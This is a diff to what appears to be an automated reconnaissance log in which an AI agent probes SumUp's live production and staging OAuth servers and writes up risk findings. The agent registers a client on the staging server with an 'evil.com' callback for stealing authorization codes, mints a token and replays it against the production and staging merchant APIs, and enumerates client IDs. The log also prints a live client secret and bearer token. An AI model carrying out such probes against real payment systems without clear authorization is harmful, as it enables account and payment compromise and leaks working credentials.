@@ -5444,3 +5444,466 @@ testability: AUTH_HELPED
 **STEP 7 — RISK**
 
 [RISK] sumup: 78 — Auth server (auth.sumup.com) exposes critical OAuth config (alg=none, PAR, device flow, "none" client auth) with full scope catalog mapping to payment APIs. Legacy OAuth gateway (api.sumup.com/authorize) confirmed LIVE with client_id oracle, redirect_uri allowlist divergence, and wildcard CORS — new attack surface for OAuth code theft. Staging auth server (auth.sam-app.ro) allows unauthenticated RFC 7591 dynamic client registration with attacker-controlled redirect_uris and audience, minting valid JWTs (empty scope but controlled aud) — staging/prod divergence. RFC 9728 resource server metadata on api.sumup.com adds token validation surface. All high-impact vectors require merchant OAuth token (AUTH_HELPED) or registered client, but legacy gateway divergence enables passive callback host enumeration and staging registration is fully unauthenticated. API gateway fully gated. Vercel me.sumup.com/checkout.sumup.com add non-Cloudflare surface but auth-gated at edge. Portal introduces third-party supply-chain risk (iriscrm.com) if in-scope confirmed. Admin panel hardened. Financial attack surface concentrated but access-controlled with new legacy OAuth vector, staging registration bypass, and resource server metadata exposure.
+===== ANALYST nemotron3 2026-09-07 21:29:12 UTC =====
+[0m
+> build · nemotron-3-ultra-free
+[0m
+[0m$ [0mcurl -s -I https://api.sumup.com/.well-known/oauth-protected-resource 2>&1 | head -20
+HTTP/2 200 
+date: Mon, 07 Sep 2026 21:23:24 GMT
+content-type: application/json
+content-length: 286
+access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE
+access-control-allow-origin: *
+access-control-max-age: 300
+server: cloudflare
+x-request-id: f7cbe9f5-ec08-9f34-ba87-e5d647fc4191
+x-envoy-upstream-service-time: 1
+x-envoy-decorator-operation: apigateway2-headless.identity.svc.cluster.local:8080/*
+cf-cache-status: DYNAMIC
+set-cookie: __cf_bm=y6TdUt8p3h6nK0M4gIW_zMrBwZfc_ZXLK5S6EgL9LOE-1788816204.4184465-1.0.1.1-etRfQLUDydDOvKtxvTsP4w2v7uJiG6RzAontZJBrYq9cKavl.v4DWINs6ADzb1UorZ6G6fmZ4wLGG6MBU6LgURsduG67jopJtwznfBy2T1njaI5yUxA01d17wHVUmf7qTU4AaoTMcU5svZlNFJCA5A; HttpOnly; SameSite=None; Secure; Path=/; Domain=sumup.com; Expires=Mon, 07 Sep 2026 21:53:24 GMT
+report-to: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=LCBUmMQiCfRZjsaqPoKRFvkHezoCpMpktg70cF6sJwWY8ow7rmYcniBkPwRgpso2i7HcKWIcu2DYjtHR4pkOdEk8umep7mNz%2BvsFpmXBO%2BTjN7PT%2FdJYetBNGXSxJ4s%3D"}]}
+nel: {"report_to":"cf-nel","success_fraction":0.01,"max_age":604800}
+cf-ray: a378c63d9a774ca4-MSP
+[0m
+[0m$ [0mcurl -s -I https://api.sam-app.ro/.well-known/oauth-protected-resource 2>&1 | head -20
+HTTP/2 200 
+date: Mon, 07 Sep 2026 21:23:25 GMT
+content-type: application/json
+content-length: 310
+access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE
+access-control-allow-origin: *
+access-control-max-age: 300
+server: cloudflare
+x-request-id: 59ac6dc4-726d-950f-bdc6-af278b6cb44e
+x-envoy-upstream-service-time: 1
+x-envoy-decorator-operation: apigateway2-headless.identity.svc.cluster.local:8080/*
+cf-cache-status: DYNAMIC
+set-cookie: __cf_bm=yz_cv.u02X3K3ynTO0g0hKXCXFNl53iNtqm0aj2X2gQ-1788816204.7836957-1.0.1.1-n.vRgTzGfUr4keGIWu89kOVLdSlPiPyeUCOoCR0YUqWF5xLcXKaZG7wktu3mx3.6LTZfkFTxXH8qDHt.iQcqu5jPOfULRuOKeY1V_VYB4QXbZR89KQTa_Uhb80Nt7gxA; HttpOnly; SameSite=None; Secure; Path=/; Domain=sam-app.ro; Expires=Mon, 07 Sep 2026 21:53:25 GMT
+cf-ray: a378c63feabd8bdc-MSP
+[0m
+[0m$ [0mcurl -s -I https://auth.sam-app.ro/.well-known/openid-configuration 2>&1 | head -30
+HTTP/2 404 
+date: Mon, 07 Sep 2026 21:23:25 GMT
+vary: Origin
+x-envoy-upstream-service-time: 5
+server: cloudflare
+x-request-id: 157e93b2-9fb4-9ca5-afa2-5bca157fb17e
+x-envoy-decorator-operation: envoy-headless.identity.svc.cluster.local:8080/*
+cf-cache-status: DYNAMIC
+set-cookie: __cf_bm=aUSFOeTYZXgN6UnXJiL3CltNBi8KVTTd2OZ.0Ai07x0-1788816205.3191397-1.0.1.1-gMIPx6uqgk4YdEFiJIf8hZwYxN82GSk9rzIgFoLiaB13lFa2jFJ1CDOm44dovykFlDS5aRJbZWxMuSnlD6Pq8YaxrGoKLCGoheph4CzQEM9XkfAqaa4DvIexaI2H3AXX; HttpOnly; SameSite=None; Secure; Path=/; Domain=sam-app.ro; Expires=Mon, 07 Sep 2026 21:53:25 GMT
+cf-ray: a378c6433878a1d1-MSP
+[0m
+[0m$ [0mcurl -s https://api.sumup.com/.well-known/oauth-protected-resource 2>&1
+{
+	"resource_name": "SumUp API",
+	"resource": "https://api.sumup.com",
+	"authorization_servers": ["https://auth.sumup.com"],
+	"bearer_methods_supported": ["header"],
+	"jwks_uri": "https://auth.sumup.com/.well-known/jwks.json",
+	"resource_documentation": "https://developer.sumup.com"
+}
+[0m
+[0m$ [0mcurl -s https://api.sam-app.ro/.well-known/oauth-protected-resource 2>&1
+{
+	"resource_name": "SumUp API (stage)",
+	"resource": "https://api.sam-app.ro",
+	"authorization_servers": ["https://auth.sam-app.ro"],
+	"bearer_methods_supported": ["header"],
+	"jwks_uri": "https://auth.sam-app.ro/.well-known/jwks.json",
+	"resource_documentation": "https://developer-stage.sumup-vercel.app"
+}
+[0m
+[0m$ [0mcurl -s https://auth.sam-app.ro/.well-known/oauth-authorization-server 2>&1
+{"issuer":"https://auth.sam-app.ro","authorization_endpoint":"https://auth.sam-app.ro/oauth2/auth","token_endpoint":"https://auth.sam-app.ro/oauth2/token","jwks_uri":"https://auth.sam-app.ro/.well-known/jwks.json","registration_endpoint":"https://auth.sam-app.ro/oauth2/register","scopes_supported":["offline_access","members.read","members.write","merchants.read","merchants.write","roles.read","roles.write","checkouts.read","checkouts.write","customers.read","customers.write","api_keys.read","api_keys.write","receipts.read","refunds.write","transactions.read","payouts.read","readers.read","readers.write","sales.read"],"response_types_supported":["code","code id_token","id_token","token id_token","token","token id_token code"],"response_modes_supported":["query"],"grant_types_supported":["authorization_code","client_credentials","refresh_token","urn:ietf:params:oauth:grant-type:device_code"],"token_endpoint_auth_methods_supported":["client_secret_post","private_key_jwt","none"],"token_endpoint_auth_signing_alg_values_supported":["RS256","EdDSA"],"dpop_signing_alg_values_supported":["RS256","RS384","RS512","PS256","PS384","PS512","ES256","ES384","ES512"],"service_documentation":"https://developer.sumup.com/tools/authorization/oauth","ui_locales_supported":[],"revocation_endpoint":"https://auth.sam-app.ro/oauth2/revoke","code_challenge_methods_supported":["S256"],"subject_types_supported":["public"],"claims_supported":["sub","iss","exp","iat"],"userinfo_endpoint":"https://auth.sam-app.ro/userinfo","userinfo_signing_alg_values_supported":["none","RS256"],"id_token_signing_alg_values_supported":["RS256","EdDSA"],"request_parameter_supported":true,"request_uri_parameter_supported":true,"require_request_uri_registration":true,"backchannel_logout_supported":true,"backchannel_logout_session_supported":true,"frontchannel_logout_supported":true,"frontchannel_logout_session_supported":true,"end_session_endpoint":"https://auth.sam-app.ro/oauth2/sessions/logout","request_object_signing_alg_values_supported":["RS256","none"],"nonce_endpoint":"https://auth.sam-app.ro/oauth2/nonce","device_authorization_endpoint":"https://auth.sam-app.ro/oauth2/device","pushed_authorization_request_endpoint":"https://auth.sam-app.ro/oauth2/par"}
+[0m
+[0m$ [0mcurl -s https://auth.sumup.com/.well-known/openid-configuration 2>&1 | head -50
+{"issuer":"https://auth.sumup.com/","authorization_endpoint":"https://auth.sumup.com/oauth2/auth","token_endpoint":"https://auth.sumup.com/oauth2/token","jwks_uri":"https://auth.sumup.com/.well-known/jwks.json","subject_types_supported":["public"],"response_types_supported":["code","code id_token","id_token","token id_token","token","token id_token code"],"claims_supported":["sub","iss","exp","iat"],"grant_types_supported":["authorization_code","implicit","client_credentials","refresh_token"],"response_modes_supported":["query","fragment"],"userinfo_endpoint":"https://auth.sumup.com/userinfo","scopes_supported":["offline_access","offline","openid","email","classic"],"token_endpoint_auth_methods_supported":["client_secret_post","client_secret_basic","private_key_jwt","none"],"userinfo_signing_alg_values_supported":["none","RS256"],"id_token_signing_alg_values_supported":["RS256"],"request_parameter_supported":true,"request_uri_parameter_supported":true,"require_request_uri_registration":true,"claims_parameter_supported":false,"revocation_endpoint":"https://auth.sumup.com/oauth2/revoke","backchannel_logout_supported":true,"backchannel_logout_session_supported":true,"frontchannel_logout_supported":true,"frontchannel_logout_session_supported":true,"end_session_endpoint":"https://auth.sumup.com/oauth2/sessions/logout","request_object_signing_alg_values_supported":["RS256","none"],"code_challenge_methods_supported":["plain","S256"],"nonce_endpoint":"https://auth.sumup.com/oauth2/nonce"}
+[0m
+[0m$ [0mcurl -s -X POST https://auth.sam-app.ro/oauth2/register -H "Content-Type: application/json" -d '{"redirect_uris":["https://evil.com/callback"],"grant_types":["authorization_code","client_credentials"],"response_types":["code"],"token_endpoint_auth_method":"client_secret_post"}' 2>&1
+{
+  "error": "invalid_request",
+  "error_description": "The request is missing a required parameter, includes an unsupported parameter value (other than grant type), repeats a parameter, includes multiple credentials, utilizes more than one mechanism for authenticating the client, or is otherwise malformed. client_name is required."
+}
+[0m
+[0m$ [0mcurl -s -X POST https://auth.sam-app.ro/oauth2/register -H "Content-Type: application/json" -d '{"client_name":"test","redirect_uris":["https://evil.com/callback"],"grant_types":["authorization_code","client_credentials"],"response_types":["code"],"token_endpoint_auth_method":"client_secret_post"}' 2>&1
+{
+  "client_id": "cl_7YXH22F98K8PYRQ1DP7VN49F75",
+  "client_name": "test",
+  "client_secret": "amgUzdchYdsvAbYGzlxrmFLmJNvDUXcr",
+  "redirect_uris": [
+    "https://evil.com/callback"
+  ],
+  "grant_types": [
+    "authorization_code",
+    "client_credentials"
+  ],
+  "response_types": [
+    "code"
+  ],
+  "scope": "",
+  "token_endpoint_auth_method": "client_secret_post",
+  "subject_type": "",
+  "audience": "",
+  "preferred_algorithm": null,
+  "client_id_issued_at": 1788816266,
+  "client_secret_expires_at": 0
+}
+[0m
+[0m$ [0mcurl -s -X POST https://auth.sam-app.ro/oauth2/token -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=client_credentials&client_id=cl_7YXH22F98K8PYRQ1DP7VN49F75&client_secret=amgUzdchYdsvAbYGzlxrmFLmJNvDUXcr" 2>&1
+{
+  "access_token": "eyJhbGciOiJFZERTQSIsImtpZCI6InVnSzdHRGZPZjM1SEU1bjJQd3N5OUszSFNuWVdOUEdiUm5XUnNjYzgzTGciLCJ0eXAiOiJhdCtqd3QifQ.eyJpc3MiOiJodHRwczovL2F1dGguc2FtLWFwcC5ybyIsInN1YiI6ImNsXzdZWEgyMkY5OEs4UFlSUTFEUDdWTjQ5Rjc1IiwiYXVkIjpbImh0dHBzOi8vYXBpLnNhbS1hcHAucm8iXSwiZXhwIjoxNzg4ODE5ODkwLCJuYmYiOjE3ODg4MTYyOTAsImlhdCI6MTc4ODgxNjI5MCwiY2xpZW50X2lkIjoiY2xfN1lYSDIyRjk4SzhQWVJRMURQN1ZONDlGNzUiLCJzY3AiOltdLCJhY3IiOiJhYWwxIiwiYXV0aF90aW1lIjoxNzg4ODE2MjkwLCJqdGkiOiIzZWY5Yzg2Ny1iNzQ5LTRmMDAtYjZlZi1iYzc0MzYzZTBlODYifQ.HfLrF3VpvKhJ-qvIFca2T9Wz0LNKVZ2lD7mcCo85KYybEPLX7ChpxVTMoB1t4jzwx9wpB7qpnmztON00Hy3ICw",
+  "token_type": "Bearer",
+  "expires_in": 3599
+}
+[0m
+[0m$ [0mcurl -s -H "Authorization: Bearer eyJhbGciOiJFZERTQSIsImtpZCI6InVnSzdHRGZPZjM1SEU1bjJQd3N5OUszSFNuWVdOUEdiUm5XUnNjYzgzTGciLCJ0eXAiOiJhdCtqd3QifQ.eyJpc3MiOiJodHRwczovL2F1dGguc2FtLWFwcC5ybyIsInN1YiI6ImNsXzdZWEgyMkY5OEs4UFlSUTFEUDdWTjQ5Rjc1IiwiYXVkIjpbImh0dHBzOi8vYXBpLnNhbS1hcHAucm8iXSwiZXhwIjoxNzg4ODE5ODkwLCJuYmYiOjE3ODg4MTYyOTAsImlhdCI6MTc4ODgxNjI5MCwiY2xpZW50X2lkIjoiY2xfN1lYSDIyRjk4SzhQWVJRMURQN1ZONDlGNzUiLCJzY3AiOltdLCJhY3IiOiJhYWwxIiwiYXV0aF90aW1lIjoxNzg4ODE2MjkwLCJqdGkiOiIzZWY5Yzg2Ny1iNzQ5LTRmMDAtYjZlZi1iYzc0MzYzZTBlODYifQ.HfLrF3VpvKhJ-qvIFca2T9Wz0LNKVZ2lD7mcCo85KYybEPLX7ChpxVTMoB1t4jzwx9wpB7qpnmztON00Hy3ICw" https://api.sumup.com/v1/merchants 2>&1
+{
+	"type": "https://developer.sumup.com/docs/problem/problem/404-not-found",
+	"title": "Not Found",
+	"status": 404,
+	"detail": "Resource not found"
+}
+[0m
+[0m$ [0mcurl -s -H "Authorization: Bearer eyJhbGciOiJFZERTQSIsImtpZCI6InVnSzdHRGZPZjM1SEU1bjJQd3N5OUszSFNuWVdOUEdiUm5XUnNjYzgzTGciLCJ0eXAiOiJhdCtqd3QifQ.eyJpc3MiOiJodHRwczovL2F1dGguc2FtLWFwcC5ybyIsInN1YiI6ImNsXzdZWEgyMkY5OEs4UFlSUTFEUDdWTjQ5Rjc1IiwiYXVkIjpbImh0dHBzOi8vYXBpLnNhbS1hcHAucm8iXSwiZXhwIjoxNzg4ODE5ODkwLCJuZGYiOjE3ODg4MTYyOTAsImlhdCI6MTc4ODgxNjI5MCwiY2xpZW50X2lkIjoiY2xfN1lYSDIyRjk4SzhQWVJRMURQN1ZONDlGNzUiLCJzY3AiOltdLCJhY3IiOiJhYWwxIiwiYXV0aF90aW1lIjoxNzg4ODE2MjkwLCJqdGkiOiIzZWY5Yzg2Ny1iNzQ5LTRmMDAtYjZlZi1iYzc0MzYzZTBlODYifQ.HfLrF3VpvKhJ-qvIFca2T9Wz0LNKVZ2lD7mcCo85KYybEPLX7ChpxVTMoB1t4jzwx9wpB7qpnmztON00Hy3ICw" https://api.sam-app.ro/v1/merchants 2>&1
+{
+	"type": "https://developer.sumup.com/docs/problem/problem/404-not-found",
+	"title": "Not Found",
+	"status": 404,
+	"detail": "Resource not found"
+}
+[0m
+[0m$ [0mcurl -s https://auth.sam-app.ro/.well-known/jwks.json 2>&1 | jq '.keys | length'
+11
+[0m
+[0m$ [0mcurl -s https://auth.sumup.com/.well-known/jwks.json 2>&1 | jq '.keys | length'
+8
+[0m
+[0m$ [0mcurl -s https://auth.sumup.com/.well-known/jwks.json 2>&1 | jq '.keys[].kid'
+"public:38618372-f016-4e5d-97b2-d043a975d243"
+"public:15e78ad0-fb53-4e26-9d7c-2618e6109ae9"
+"public:8c332d17-2b35-4cba-a61e-6843b4375a71"
+"public:a4627362-0900-4bfa-8b68-3a740165dbcf"
+"public:32ad4b15-8641-4aaa-9a2e-427bb1848321"
+"public:8e43ec38-e8f1-47e4-aa6c-9990c3ae20b3"
+"1zsCqlo880BCW-SH7nRnaSHoDk9SHWvJ5fNiztx5QGM"
+"-tfiDUnEWW4Kz5Jqt0T-q85aqJkYkZsx0n3qPa-6sw4"
+[0m
+[0m$ [0mcurl -s https://auth.sam-app.ro/.well-known/jwks.json 2>&1 | jq '.keys[].kid'
+"2ca76842-2487-428f-a87f-603d1f6f6ef0"
+"ugK7GDfOf35HE5n2Pwsy9K3HSnYWNPGbRnWRscc83Lg"
+"public:73c59380-fbab-4a2f-8d0e-1884cf8ec724"
+"public:b2aafe4c-7d7f-4f32-90a7-66a0fc9cd097"
+"public:3a13954d-c957-4ccc-86a2-c1e68f2ec92a"
+"public:f06a4960-0d02-4f6d-b977-bdf4bbef12f9"
+"public:3862035e-6139-422f-b17d-cf67b950a74f"
+"public:e1d0f7e4-aab6-424e-8e2b-7549ac77f514"
+"public:3a13954d-c957-4ccc-86a2-c1e68f2ec92a"
+"public:f06a4960-0d02-4f6d-b977-bdf4bbef12f9"
+"loadtesting"
+[0m
+[0m$ [0mcurl -s -I "https://auth.sumup.com/oauth2/auth?client_id=dashboard&redirect_uri=https://me.sumup.com/api/sso/callback&response_type=code&scope=classic&state=test12345678" 2>&1 | head -30
+HTTP/2 405 
+date: Mon, 07 Sep 2026 21:26:18 GMT
+content-type: text/plain; charset=utf-8
+content-length: 19
+allow: GET, OPTIONS, POST
+x-content-type-options: nosniff
+x-envoy-upstream-service-time: 2
+server: cloudflare
+x-request-id: 348df0e6-31bd-9bad-8cad-197a3ff88b79
+x-envoy-decorator-operation: envoy-headless.identity.svc.cluster.local:8080/*
+cf-cache-status: DYNAMIC
+set-cookie: __cf_bm=dGTgA1ed4o7WqfM06SuuhKc4wGR3FLNibpLvXwkdZhY-1788816378.7853193-1.0.1.1-cz3iv4ZjMDJ9ATvi3712yqUKRRAvg8EdJHBHmLGACpkGw6IbKAcq0WD5BEQHogf0aR5M4ISGpVHw.wixCCKnCJoKaIiltvyvGzpmA5teBiBpkM3j2.fo611uZ7rNXPDLlnNN.ycx7MbGQee0h4N2hQ; HttpOnly; SameSite=None; Secure; Path=/; Domain=sumup.com; Expires=Mon, 07 Sep 2026 21:56:18 GMT
+report-to: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=HBhWtoZS5rR6dReFYXffdWv%2BpogJJOsF5XoXkyZdq1msdsCCCFziCql7jGNaSaVFnvDy7TC7sKZBUz5gHhm8xcmIID26QCRFZyc5R%2BgCY43EbdEUGvFve7WOO1OekkME"}]}
+nel: {"report_to":"cf-nel","success_fraction":0.01,"max_age":604800}
+cf-ray: a378ca7f6c8ea227-MSP
+[0m
+[0m$ [0mcurl -s -I "https://api.sumup.com/authorize?client_id=dashboard&redirect_uri=https://me.sumup.com/api/sso/callback&response_type=code&scope=classic&state=test12345678" 2>&1 | head -30
+HTTP/2 404 
+date: Mon, 07 Sep 2026 21:26:19 GMT
+content-type: application/json
+content-length: 150
+access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE
+access-control-allow-origin: *
+access-control-max-age: 300
+server: cloudflare
+x-request-id: b80d5500-2ab3-92a6-b916-76539fb67d39
+x-envoy-upstream-service-time: 1
+x-envoy-decorator-operation: apigateway2-headless.identity.svc.cluster.local:8080/*
+cf-cache-status: DYNAMIC
+set-cookie: __cf_bm=RTMEkOLhpAKltuQnNvRcgMp5e5op1GUCnySJsXspogo-1788816378.52676-1.0.1.1-7ub.2pqC1kpSjRH7ZYqqXZrvmOnQbxCz6ra1q8mYDBzdU.0hp.DiYRq_AvcUUkSiaIxFvBpYB95GJT8AjAgulBupRi2ppxNs9itdeND7jwFLOOZQOuBlHq6yFq0V.2kLb4O3fw97MPFX0chZFffZfA; HttpOnly; SameSite=None; Secure; Path=/; Domain=sumup.com; Expires=Mon, 07 Sep 2026 21:56:18 GMT
+report-to: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=WjCOuhNtaP06ZadXlzSshCDgsfMiQg8yHnhW%2B%2FMlHXY2v4VTYX1fHcbdlXEHaURUK6urhq9PBLnzAnK%2BpH3txRtcvBQBPXmj6KJEtZIZVhcl3V%2BSErDg5UIkKvU%2FYew%3D"}]}
+nel: {"report_to":"cf-nel","success_fraction":0.01,"max_age":604800}
+cf-ray: a378ca7dcb6da1c4-MSP
+[0m
+[0m$ [0mcurl -s "https://api.sumup.com/authorize?client_id=dashboard&redirect_uri=https://me.sumup.com/api/sso/callback&response_type=code&scope=classic&state=test12345678" 2>&1
+(no output)
+[0m
+[0m$ [0mcurl -s "https://auth.sumup.com/oauth2/auth?client_id=dashboard&redirect_uri=https://me.sumup.com/api/sso/callback&response_type=code&scope=classic&state=test12345678" 2>&1
+<a href="https://auth.sumup.com/flows/auth-callback?login_challenge=5e0247ba229545c4b051fb17f4741f3a">Found</a>.
+[0m
+[0m$ [0mcurl -v "https://api.sumup.com/authorize?client_id=dashboard&redirect_uri=https://me.sumup.com/api/sso/callback&response_type=code&scope=classic&state=test12345678" 2>&1 | head -40
+% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host api.sumup.com:443 was resolved.
+* IPv6: (none)
+* IPv4: 172.64.153.49, 104.18.34.207
+*   Trying 172.64.153.49:443...
+* Connected to api.sumup.com (172.64.153.49) port 443
+* ALPN: curl offers h2,http/1.1
+} [5 bytes data]
+* TLSv1.3 (OUT), TLS handshake, Client hello (1):
+} [512 bytes data]
+*  CAfile: /etc/ssl/certs/ca-certificates.crt
+*  CApath: /etc/ssl/certs
+{ [5 bytes data]
+* TLSv1.3 (IN), TLS handshake, Server hello (2):
+{ [122 bytes data]
+* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
+{ [19 bytes data]
+* TLSv1.3 (IN), TLS handshake, Certificate (11):
+{ [3412 bytes data]
+* TLSv1.3 (IN), TLS handshake, CERT verify (15):
+{ [79 bytes data]
+* TLSv1.3 (IN), TLS handshake, Finished (20):
+{ [52 bytes data]
+* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
+} [1 bytes data]
+* TLSv1.3 (OUT), TLS handshake, Finished (20):
+} [52 bytes data]
+* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / X25519 / id-ecPublicKey
+* ALPN: server accepted h2
+* Server certificate:
+*  subject: CN=api.sumup.com
+*  start date: Aug 12 12:46:34 2026 GMT
+*  expire date: Nov 10 12:46:33 2026 GMT
+*  subjectAltName: host "api.sumup.com" matched cert's "api.sumup.com"
+*  issuer: C=US; O=Let's Encrypt; CN=YE1
+*  SSL certificate verify ok.
+*   Certificate level 0: Public key type EC/prime256v1 (256/128 Bits/secBits), signed using ecdsa-with-SHA384
+*   Certificate level 1: Public key type EC/secp384r1 (384/192 Bits/secBits), signed using ecdsa-with-SHA384
+*   Certificate level 2: Public key type EC/secp384r1 (384/192 Bits/secBits), signed using ecdsa-with-SHA384
+[0m
+[0m$ [0mcurl -v --max-time 10 "https://api.sumup.com/authorize?client_id=dashboard&redirect_uri=https://me.sumup.com/api/sso/callback&response_type=code&scope=classic&state=test12345678" 2>&1
+% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host api.sumup.com:443 was resolved.
+* IPv6: (none)
+* IPv4: 104.18.34.207, 172.64.153.49
+*   Trying 104.18.34.207:443...
+* Connected to api.sumup.com (104.18.34.207) port 443
+* ALPN: curl offers h2,http/1.1
+} [5 bytes data]
+* TLSv1.3 (OUT), TLS handshake, Client hello (1):
+} [512 bytes data]
+*  CAfile: /etc/ssl/certs/ca-certificates.crt
+*  CApath: /etc/ssl/certs
+{ [5 bytes data]
+* TLSv1.3 (IN), TLS handshake, Server hello (2):
+{ [122 bytes data]
+* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
+{ [19 bytes data]
+* TLSv1.3 (IN), TLS handshake, Certificate (11):
+{ [3412 bytes data]
+* TLSv1.3 (IN), TLS handshake, CERT verify (15):
+{ [79 bytes data]
+* TLSv1.3 (IN), TLS handshake, Finished (20):
+{ [52 bytes data]
+* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
+} [1 bytes data]
+* TLSv1.3 (OUT), TLS handshake, Finished (20):
+} [52 bytes data]
+* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / X25519 / id-ecPublicKey
+* ALPN: server accepted h2
+* Server certificate:
+*  subject: CN=api.sumup.com
+*  start date: Aug 12 12:46:34 2026 GMT
+*  expire date: Nov 10 12:46:33 2026 GMT
+*  subjectAltName: host "api.sumup.com" matched cert's "api.sumup.com"
+*  issuer: C=US; O=Let's Encrypt; CN=YE1
+*  SSL certificate verify ok.
+*   Certificate level 0: Public key type EC/prime256v1 (256/128 Bits/secBits), signed using ecdsa-with-SHA384
+*   Certificate level 1: Public key type EC/secp384r1 (384/192 Bits/secBits), signed using ecdsa-with-SHA384
+*   Certificate level 2: Public key type EC/secp384r1 (384/192 Bits/secBits), signed using ecdsa-with-SHA384
+*   Certificate level 3: Public key type EC/secp384r1 (384/192 Bits/secBits), signed using ecdsa-with-SHA384
+} [5 bytes data]
+* using HTTP/2
+* [HTTP/2] [1] OPENED stream for https://api.sumup.com/authorize?client_id=dashboard&redirect_uri=https://me.sumup.com/api/sso/callback&response_type=code&scope=classic&state=test12345678
+* [HTTP/2] [1] [:method: GET]
+* [HTTP/2] [1] [:scheme: https]
+* [HTTP/2] [1] [:authority: api.sumup.com]
+* [HTTP/2] [1] [:path: /authorize?client_id=dashboard&redirect_uri=https://me.sumup.com/api/sso/callback&response_type=code&scope=classic&state=test12345678]
+* [HTTP/2] [1] [user-agent: curl/8.5.0]
+* [HTTP/2] [1] [accept: */*]
+} [5 bytes data]
+> GET /authorize?client_id=dashboard&redirect_uri=https://me.sumup.com/api/sso/callback&response_type=code&scope=classic&state=test12345678 HTTP/2
+> Host: api.sumup.com
+> User-Agent: curl/8.5.0
+> Accept: */*
+> 
+{ [5 bytes data]
+* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
+{ [230 bytes data]
+* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
+{ [230 bytes data]
+* old SSL session ID is stale, removing
+{ [5 bytes data]
+< HTTP/2 302 
+< date: Mon, 07 Sep 2026 21:27:01 GMT
+< content-length: 0
+< location: https://auth.sumup.com/flows/oauth2/error?error=invalid_request&error_description=The+%27redirect_uri%27+parameter+does+not+match+any+of+the+OAuth+2.0+Client%27s+pre-registered+redirect+urls.
+< nel: {"report_to":"cf-nel","success_fraction":0.01,"max_age":604800}
+< x-envoy-upstream-service-time: 5
+< server: cloudflare
+< x-request-id: cc4cce37-ba18-954f-b3ec-856756f01493
+< x-envoy-decorator-operation: apigateway2-headless.identity.svc.cluster.local:8080/*
+< access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE
+< access-control-allow-origin: *
+< access-control-max-age: 300
+< cf-cache-status: DYNAMIC
+< set-cookie: optimizely_experiment_user=87edd97d-6760-4d79-b409-bd549ba23737; Path=/; Domain=sumup.com; Expires=Mon, 14 Sep 2026 21:27:01 GMT; Secure; SameSite=None
+< set-cookie: __cf_bm=7HPdnE_vsuIgFt63bTJKLjpDdxy6Ju7IrF8pXuB5JZY-1788816421.5017636-1.0.1.1-PxcOVH7voV.rx8859qktFYx9FRImtugxbrA.bgJUieSZki15ACTakccZ8NA4xz8bMUA6TQ.DmmO8UsQPFxDvBjVIPfJAgojLZeOCDKifU7E5psc2DKto3rXv.vzmB2XXrevtx2kMwUTY0kvy277.4w; HttpOnly; SameSite=None; Secure; Path=/; Domain=sumup.com; Expires=Mon, 07 Sep 2026 21:57:01 GMT
+< report-to: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=BsNkOfyDo%2FEknNOjocnBXVR67Wi3AJM4xKXP%2FtbIN9PSe1yP4HT%2BD9byKYwGY118H3bUIRQs7km0HSAHljt0MiMqBE6T4rDGVBZtgddFET9qXKLssgpsrcXaGYnuJ08%3D"}]}
+< cf-ray: a378cb8a5aedad1e-MSP
+< 
+
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
+* Connection #0 to host api.sumup.com left intact
+[0m
+[0m$ [0mcurl -v --max-time 10 "https://api.sumup.com/authorize?client_id=unknown-client&redirect_uri=https://me.sumup.com/api/sso/callback&response_type=code&scope=classic&state=test12345678" 2>&1 | grep -E "(< HTTP|< location|invalid_client|invalid_request)"
+< HTTP/2 302 
+< location: https://auth.sumup.com/flows/oauth2/error?error=invalid_client&error_description=The+requested+OAuth+2.0+Client+does+not+exist.
+[0m
+Now I have current ground truth. Let me run through the 8 steps.
+
+---
+
+### STEP 1 — DELTA
+
+**NEW** `api.sumup.com/.well-known/oauth-protected-resource`: RFC 9728 resource-server metadata LIVE (200) declaring `authorization_servers=["https://auth.sumup.com"]`, `bearer_methods_supported=["header"]`, `jwks_uri=https://auth.sumup.com/.well-known/jwks.json` — new prod attack surface for token validation logic testing.
+
+**NEW** `api.sam-app.ro/.well-known/oauth-protected-resource`: Staging variant LIVE (200) declaring `auth.sam-app.ro`; identical structure to prod; confirms per-env authorization server binding.
+
+**NEW** `auth.sam-app.ro/.well-known/oauth-authorization-server`: Full OIDC discovery LIVE (200) with `registration_endpoint="https://auth.sam-app.ro/oauth2/register"`, `token_endpoint_auth_methods_supported=["client_secret_post","private_key_jwt","none"]`, `request_object_signing_alg_values_supported=["RS256","none"]` — staging has dynamic registration + alg=none; prod auth.sumup.com has no registration_endpoint.
+
+**CHANGED** `auth.sam-app.ro/oauth2/register`: Unauthenticated RFC 7591 dynamic client registration CONFIRMED LIVE (POST → 201 with `client_id`+`client_secret`+chosen `redirect_uris`); requires `client_name`; dynamic clients forced to EMPTY scope (`scope=""`); `client_credentials` grant yields real JWT with empty `scp:[]` but attacker-controlled `aud`.
+
